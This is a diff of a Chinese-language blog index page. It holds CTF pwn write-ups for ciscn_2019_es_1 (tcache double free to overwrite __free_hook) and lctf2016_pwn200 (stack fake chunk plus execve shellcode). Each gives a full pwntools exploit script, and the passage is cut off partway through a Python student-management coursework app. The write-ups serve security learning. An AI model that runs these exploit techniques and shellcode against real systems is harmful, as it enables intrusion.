@@ -206,6 +206,258 @@
             
 
   
+    <article id="post-ciscn-2019-es-1" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+  
+  
+    <h1 itemprop="name">
+	
+	  <a class="article-title" href="/2024/01/22/ciscn-2019-es-1/" target="_blank">ciscn_2019_es_1</a>
+  
+    </h1>
+  
+
+
+  
+  
+<a href="/2024/01/22/ciscn-2019-es-1/" class="archive-article-date">
+        <time datetime="2024-01-21T16:08:54.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2024-01-22</time>
+</a>
+
+  
+  
+    
+
+  
+  </header>
+  
+  <div class="article-entry" itemprop="articleBody">
+    
+    <h4 id="ciscn-2019-es-1"><a href="#ciscn-2019-es-1" class="headerlink" title="ciscn_2019_es_1"></a>ciscn_2019_es_1</h4><h4 id="checksec一下，保护全开"><a href="#checksec一下，保护全开" class="headerlink" title="checksec一下，保护全开"></a>checksec一下，保护全开</h4><p><img src="https://i0.imgs.ovh/2024/01/22/sJtxT.png" alt="image-20230921162920468"></p>
+<h4 id="add"><a href="#add" class="headerlink" title="add"></a>add<img src="https://i0.imgs.ovh/2024/01/22/sJzLl.png" alt="image-20230921163026621"></h4><h4 id="show函数，可以输出我们想要的地址然后算偏移"><a href="#show函数，可以输出我们想要的地址然后算偏移" class="headerlink" title="show函数，可以输出我们想要的地址然后算偏移"></a>show函数，可以输出我们想要的地址然后算偏移</h4><p><img src="https://i0.imgs.ovh/2024/01/22/sJgZp.png" alt="image-20230921163115792"></p>
+<h4 id="delete函数，没有把指针置零，存在UAF漏洞"><a href="#delete函数，没有把指针置零，存在UAF漏洞" class="headerlink" title="delete函数，没有把指针置零，存在UAF漏洞"></a>delete函数，没有把指针置零，存在UAF漏洞</h4><p><img src="https://i0.imgs.ovh/2024/01/22/sJcDR.png" alt="image-20230921163210886"></p>
+<h4 id="过程虽然理清，但仍然有点懵逼。"><a href="#过程虽然理清，但仍然有点懵逼。" class="headerlink" title="过程虽然理清，但仍然有点懵逼。"></a>过程虽然理清，但仍然有点懵逼。</h4><h4 id="先创三个堆"><a href="#先创三个堆" class="headerlink" title="先创三个堆"></a>先创三个堆</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x410</span>,<span class="string">&quot;AAAA&quot;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&quot;AAAA&quot;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&quot;bin/sh&quot;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="libc是2-27版本，就会有tachebin机制，free的大小大于0x400则可以绕过这个机制，而他的fd和bk指针都会指向main-arena-96这个地址，show函数把它输出出来并算出偏移量并算出free-hook的地址和system函数的地址。"><a href="#libc是2-27版本，就会有tachebin机制，free的大小大于0x400则可以绕过这个机制，而他的fd和bk指针都会指向main-arena-96这个地址，show函数把它输出出来并算出偏移量并算出free-hook的地址和system函数的地址。" class="headerlink" title="libc是2.27版本，就会有tachebin机制，free的大小大于0x400则可以绕过这个机制，而他的fd和bk指针都会指向main_arena+96这个地址，show函数把它输出出来并算出偏移量并算出free_hook的地址和system函数的地址。"></a>libc是2.27版本，就会有tachebin机制，free的大小大于0x400则可以绕过这个机制，而他的fd和bk指针都会指向main_arena+96这个地址，show函数把它输出出来并算出偏移量并算出free_hook的地址和system函数的地址。</h4><p><img src="https://i0.imgs.ovh/2024/01/22/sJR7N.png" alt="image-20230921163638325"></p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">malloc_hook_addr = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">96</span>-<span class="number">0x10</span></span><br><span class="line">base_addr = malloc_hook_addr - libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">free_hook = base_addr + libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system_addr = base_addr + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h4 id="然后用double-free，free两次堆2，然后堆2的如下，以及bin"><a href="#然后用double-free，free两次堆2，然后堆2的如下，以及bin" class="headerlink" title="然后用double free，free两次堆2，然后堆2的如下，以及bin"></a>然后用double free，free两次堆2，然后堆2的如下，以及bin</h4><p><img src="https://i0.imgs.ovh/2024/01/22/sJ1ju.png" alt="image-20230921164207791"></p>
+<p><img src="https://i0.imgs.ovh/2024/01/22/sJUkd.png" alt="image-20230921164236453"></p>
+<h4 id="bin指针链0x000055ac61f846c0这个地址记录了它本身"><a href="#bin指针链0x000055ac61f846c0这个地址记录了它本身" class="headerlink" title="bin指针链0x000055ac61f846c0这个地址记录了它本身"></a>bin指针链0x000055ac61f846c0这个地址记录了它本身</h4><h4 id="这里也许是tachebin的机制，再次malloc时，会先创建一个堆记录下一个堆的地址，而下一个堆正是我们add函数的过程，在0x000055ac61f846c0这个地址写入的是free-hook的地址，但是它依然还是在bin链中的，这就很不解，明明已经被使用了，这时bin链的指针指到了free-hook，我们再malloc"><a href="#这里也许是tachebin的机制，再次malloc时，会先创建一个堆记录下一个堆的地址，而下一个堆正是我们add函数的过程，在0x000055ac61f846c0这个地址写入的是free-hook的地址，但是它依然还是在bin链中的，这就很不解，明明已经被使用了，这时bin链的指针指到了free-hook，我们再malloc" class="headerlink" title="这里也许是tachebin的机制，再次malloc时，会先创建一个堆记录下一个堆的地址，而下一个堆正是我们add函数的过程，在0x000055ac61f846c0这个地址写入的是free_hook的地址，但是它依然还是在bin链中的，这就很不解，明明已经被使用了，这时bin链的指针指到了free_hook，我们再malloc"></a>这里也许是tachebin的机制，再次malloc时，会先创建一个堆记录下一个堆的地址，而下一个堆正是我们add函数的过程，在0x000055ac61f846c0这个地址写入的是free_hook的地址，但是它依然还是在bin链中的，这就很不解，明明已经被使用了，这时bin链的指针指到了free_hook，我们再malloc</h4><p><img src="https://i0.imgs.ovh/2024/01/22/sJja2.png" alt="image-20230921164455578"></p>
+<h4 id="这时bin链的指针指到了free-hook，我们再malloc两次就能把free-hook函数的地址内容改成system函数的地址-而都同add函数一样正常mollc，参数bin-sh放在堆3"><a href="#这时bin链的指针指到了free-hook，我们再malloc两次就能把free-hook函数的地址内容改成system函数的地址-而都同add函数一样正常mollc，参数bin-sh放在堆3" class="headerlink" title="这时bin链的指针指到了free_hook，我们再malloc两次就能把free_hook函数的地址内容改成system函数的地址,而都同add函数一样正常mollc，参数bin&#x2F;sh放在堆3"></a>这时bin链的指针指到了free_hook，我们再malloc两次就能把free_hook函数的地址内容改成system函数的地址,而都同add函数一样正常mollc，参数bin&#x2F;sh放在堆3</h4><p><img src="https://i0.imgs.ovh/2024/01/22/sJitK.png" alt="image-20230921164925744"></p>
+<p><img src="https://i0.imgs.ovh/2024/01/22/sJ5wj.png" alt="image-20230921165411511"></p>
+<p>exp</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=remote(&quot;node4.buuoj.cn&quot;,28022)</span></span><br><span class="line">p=process(<span class="string">&quot;./ciscn_2019_es_1&quot;</span>)</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line">elf=ELF(<span class="string">&quot;./ciscn_2019_es_1&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;./libc-2.27.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,name</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&quot;choice:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;name&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="built_in">int</span>(size)))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;name:&quot;</span>)</span><br><span class="line">    p.sendline(name)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;call&quot;</span>)</span><br><span class="line">    p.sendline(name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">dex</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice:&quot;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;index:&quot;</span>,<span class="built_in">str</span>(dex))  </span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">dex</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice:&quot;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;index:\n&quot;</span>,<span class="built_in">str</span>(dex)) </span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">add(<span class="number">0x410</span>,<span class="string">&quot;AAAA&quot;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&quot;AAAA&quot;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&quot;bin/sh&quot;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">malloc_hook_addr = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">96</span>-<span class="number">0x10</span></span><br><span class="line">base_addr = malloc_hook_addr - libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">free_hook = base_addr + libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system_addr = base_addr + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>,p64(free_hook))</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;MMMM&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>,p64(system_addr))</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p.sendline(payload)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+    
+
+    
+
+    
+
+  </div>
+  <div class="article-info article-info-index">
+    
+    
+    
+
+    
+    <p class="article-more-link">
+      <a class="article-more-a" href="/2024/01/22/ciscn-2019-es-1/">展开全文 >></a>
+    </p>
+    
+
+    
+    <div class="clearfix"></div>
+  </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-lctf2016_pwn200" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+  
+  
+    <h1 itemprop="name">
+	
+	  <a class="article-title" href="/2024/01/14/lctf2016_pwn200/" target="_blank">lctf2016_pwn200</a>
+  
+    </h1>
+  
+
+
+  
+  
+<a href="/2024/01/14/lctf2016_pwn200/" class="archive-article-date">
+        <time datetime="2024-01-14T12:22:41.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2024-01-14</time>
+</a>
+
+  
+  
+    
+
+  
+  </header>
+  
+  <div class="article-entry" itemprop="articleBody">
+    
+    <h3 id="lctf2016-pwn200"><a href="#lctf2016-pwn200" class="headerlink" title="lctf2016_pwn200"></a>lctf2016_pwn200</h3><h4 id="一道有点难的堆题"><a href="#一道有点难的堆题" class="headerlink" title="一道有点难的堆题"></a>一道有点难的堆题</h4><h4 id="这是主函数的结构，当我们输入满0x40时能够把主函数的ebp的地址泄露出来"><a href="#这是主函数的结构，当我们输入满0x40时能够把主函数的ebp的地址泄露出来" class="headerlink" title="这是主函数的结构，当我们输入满0x40时能够把主函数的ebp的地址泄露出来"></a>这是主函数的结构，当我们输入满0x40时能够把主函数的ebp的地址泄露出来</h4><p><img src="https://i0.imgs.ovh/2024/01/14/hZ3VW.png" alt="image-20240114222351986"></p>
+<h4 id="下面小a的末尾的rbp寄存器存着主函数的rbp"><a href="#下面小a的末尾的rbp寄存器存着主函数的rbp" class="headerlink" title="下面小a的末尾的rbp寄存器存着主函数的rbp"></a>下面小a的末尾的rbp寄存器存着主函数的rbp</h4><p><img src="https://i0.imgs.ovh/2024/01/14/hZfWv.png" alt="image-20240114222408532"></p>
+<h4 id="后面还调用了两个函数，说明这两个函数的栈帧离得不远，而这个函数，可以构造我们的fakechunk-还有我们的shellcode"><a href="#后面还调用了两个函数，说明这两个函数的栈帧离得不远，而这个函数，可以构造我们的fakechunk-还有我们的shellcode" class="headerlink" title="后面还调用了两个函数，说明这两个函数的栈帧离得不远，而这个函数，可以构造我们的fakechunk,还有我们的shellcode"></a>后面还调用了两个函数，说明这两个函数的栈帧离得不远，而这个函数，可以构造我们的fakechunk,还有我们的shellcode</h4><p><img src="https://i0.imgs.ovh/2024/01/14/hZmge.png" alt="image-20240114222423230"></p>
+<h4 id="shellcode第一个得是’-x00’防止复制过去，造成影响"><a href="#shellcode第一个得是’-x00’防止复制过去，造成影响" class="headerlink" title="shellcode第一个得是’\x00’防止复制过去，造成影响"></a>shellcode第一个得是’\x00’防止复制过去，造成影响</h4><h4 id="申请得到得堆的地址和给过去的不太一样，这是构造的栈的结构"><a href="#申请得到得堆的地址和给过去的不太一样，这是构造的栈的结构" class="headerlink" title="申请得到得堆的地址和给过去的不太一样，这是构造的栈的结构"></a>申请得到得堆的地址和给过去的不太一样，这是构造的栈的结构</h4><p><img src="https://i0.imgs.ovh/2024/01/14/hZ6N3.png" alt="image-20240114222437905"></p>
+<p><img src="https://i0.imgs.ovh/2024/01/14/hZkp9.png" alt="image-20240114222456777"></p>
+<h4 id="然后ptr指针的值被覆盖成栈上的，等我们free再malloc的时候就能申请到这，但是大小得是0x30，因为我们构造的fakechunk的大小是0x40的大小，这样才能malloc到我们的栈上，从而覆盖到返回地址，而返回地址得写成shellcode开始的地址。"><a href="#然后ptr指针的值被覆盖成栈上的，等我们free再malloc的时候就能申请到这，但是大小得是0x30，因为我们构造的fakechunk的大小是0x40的大小，这样才能malloc到我们的栈上，从而覆盖到返回地址，而返回地址得写成shellcode开始的地址。" class="headerlink" title="然后ptr指针的值被覆盖成栈上的，等我们free再malloc的时候就能申请到这，但是大小得是0x30，因为我们构造的fakechunk的大小是0x40的大小，这样才能malloc到我们的栈上，从而覆盖到返回地址，而返回地址得写成shellcode开始的地址。"></a>然后ptr指针的值被覆盖成栈上的，等我们free再malloc的时候就能申请到这，但是大小得是0x30，因为我们构造的fakechunk的大小是0x40的大小，这样才能malloc到我们的栈上，从而覆盖到返回地址，而返回地址得写成shellcode开始的地址。</h4><h4 id="shellcode的结构应该写出这样的结构。"><a href="#shellcode的结构应该写出这样的结构。" class="headerlink" title="shellcode的结构应该写出这样的结构。"></a>shellcode的结构应该写出这样的结构。</h4><p><img src="https://i0.imgs.ovh/2024/01/14/hZ07O.png" alt="image-20240114222514160"></p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="number">3</span>*p64(<span class="number">0</span>)+p64(rbp-<span class="number">0xc0</span>+<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+
+<h4 id="再次申请覆盖掉返回地址，最后程序返回的时候会执行shellcode"><a href="#再次申请覆盖掉返回地址，最后程序返回的时候会执行shellcode" class="headerlink" title="再次申请覆盖掉返回地址，最后程序返回的时候会执行shellcode"></a>再次申请覆盖掉返回地址，最后程序返回的时候会执行shellcode</h4><h4 id=""><a href="#" class="headerlink" title=""></a><img src="https://i0.imgs.ovh/2024/01/14/hZpiJ.png" alt="image-20231010144445729"></h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=remote(&quot;node4.buuoj.cn&quot;,28868)</span></span><br><span class="line">p=process(<span class="string">&quot;./pwn200&quot;</span>)</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x30</span></span><br><span class="line">p.sendafter(<span class="string">&#x27;u?&#x27;</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line">rbp=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(rbp))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">shellcode=<span class="string">&quot;\x00\x31\xf6\x48\xbb\x2f\x62\x69\x6e&quot;</span></span><br><span class="line">shellcode+= <span class="string">&quot;\x2f\x2f\x73\x68\x56\x53\x54\x5f&quot;</span></span><br><span class="line">shellcode += <span class="string">&quot;\x6a\x3b\x58\x31\xd2\x0f\x05&quot;</span></span><br><span class="line"></span><br><span class="line">payload=(shellcode+<span class="number">2</span>*p64(<span class="number">0</span>)+p64(<span class="number">0X41</span>)).ljust(<span class="number">0x38</span>,<span class="string">&#x27;\x00&#x27;</span>)  <span class="comment">#gouzhao fakebchunk</span></span><br><span class="line">payload+=p64(rbp-<span class="number">0x90</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;id ~~?&#x27;</span>,<span class="string">&#x27;31&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(rbp-<span class="number">0x90</span>))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;money~&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;choice : &#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"><span class="comment">#p.recvuntil(&#x27;\n&#x27;)</span></span><br><span class="line">gdb.attach(p)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;choice : &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;long?&#x27;</span>,<span class="string">&#x27;48&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="number">3</span>*p64(<span class="number">0</span>)+p64(rbp-<span class="number">0xc0</span>+<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;money : &#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;choice : &#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p.sendline(payload)</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+    
+
+    
+
+    
+
+  </div>
+  <div class="article-info article-info-index">
+    
+    
+    
+
+    
+    <p class="article-more-link">
+      <a class="article-more-a" href="/2024/01/14/lctf2016_pwn200/">展开全文 >></a>
+    </p>
+    
+
+    
+    <div class="clearfix"></div>
+  </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-python课设" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+  
+  
+    <h1 itemprop="name">
+	
+	  <a class="article-title" href="/2023/12/25/python%E8%AF%BE%E8%AE%BE/" target="_blank">python课设</a>
+  
+    </h1>
+  
+
+
+  
+  
+<a href="/2023/12/25/python%E8%AF%BE%E8%AE%BE/" class="archive-article-date">
+        <time datetime="2023-12-25T14:49:46.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2023-12-25</time>
+</a>
+
+  
+  
+    
+
+  
+  </header>
+  
+  <div class="article-entry" itemprop="articleBody">
+    
+    <figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tkinter <span class="keyword">as</span> tk</span><br><span class="line"><span class="keyword">from</span> tkinter <span class="keyword">import</span> messagebox, simpledialog</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">STUDENT_FILE = <span class="string">&#x27;students.json&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load_students</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(STUDENT_FILE):</span><br><span class="line">        <span class="keyword">return</span> []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(STUDENT_FILE, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        <span class="keyword">return</span> json.load(file)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">save_students</span>(<span class="params">students</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(STUDENT_FILE, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        json.dump(students, file, ensure_ascii=<span class="literal">False</span>, indent=<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show_students</span>(<span class="params">students</span>):</span><br><span class="line">    sorted_students = <span class="built_in">sorted</span>(students, key=<span class="keyword">lambda</span> x: x[<span class="string">&#x27;id&#x27;</span>])  